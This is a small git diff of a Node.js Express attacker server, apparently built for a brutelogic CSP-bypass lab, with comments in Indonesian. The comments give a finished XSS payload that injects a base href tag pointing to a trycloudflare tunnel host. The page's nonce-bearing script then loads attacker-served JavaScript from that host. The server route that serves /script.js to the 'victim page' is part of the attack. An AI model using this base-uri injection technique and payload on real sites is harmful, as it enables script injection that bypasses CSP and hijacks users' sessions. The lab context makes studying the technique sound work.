@@ -7,10 +7,13 @@ app.use((req, res, next) => {
   next();
 });
 
-// Serve script.js - file yang akan di-load oleh victim page
+// /script.js - file yang akan di-load oleh victim page
 // /script.js ini disesuaikan dimana letak nonce
-// di case ini, lab brutelogic, letak noncec ada di script.js, maka path-nya = script.js
+
+// di case lab brutelogic ini, letak nonce ada di script.js: 
 // <script src="script.js" nonce="1c23ee965f8410c6"></script>
+// maka path server yang kita buat = /script.js
+
 // Lab url: https://x55.is/brutelogic/csp/csp-base-uri.php?p=
 // Final payload: // https://x55.is/brutelogic/csp/csp-base-uri.php?p=%3CBase%20Href=//reed-ringtones-exam-francis.trycloudflare.com%3E
 app.get('/script.js', (req, res) => {
